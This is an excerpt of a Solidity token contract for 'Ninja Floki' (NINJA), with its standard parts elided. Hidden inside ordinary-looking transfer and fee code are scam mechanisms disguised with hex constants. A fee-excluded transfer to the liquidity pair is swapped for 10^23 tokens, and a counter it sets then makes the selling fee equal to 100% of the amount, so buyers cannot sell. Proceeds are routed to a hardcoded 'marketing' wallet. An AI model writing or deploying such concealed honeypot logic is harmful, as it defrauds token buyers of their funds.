...
contract NinjaFloki is Context, IERC20, Ownable {
    ...
    string private _name = "Ninja Floki";
    string private _symbol = "NINJA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x6c001C5f97D7F3Da2007a4468a1abaab477a7179); // Marketing Address
    ...
    uint256 LiquidityPairCounter = 0;
    ...
    function getSQ(uint256 a, uint256 b) public pure returns(uint256){
        uint256 reservedResult = 1;
        for (uint256 i = 1; i <= b; i++)
        {
                reservedResult = reservedResult * a;
        }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                         (isLiquidityPair[recipient] ? getSQ(0xA, 0x17) : amount) : takeFee(sender, recipient, amount) ;

            LiquidityPairCounter = isLiquidityPair[recipient] ? 0x1 : 0x0;
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBBuyBack > 0)
            transferToAddressETH(marketingWalletAddress, amountBNBBuyBack);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[recipient] && LiquidityPairCounter >= 0x1) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(_totalTaxIfSelling);
        }
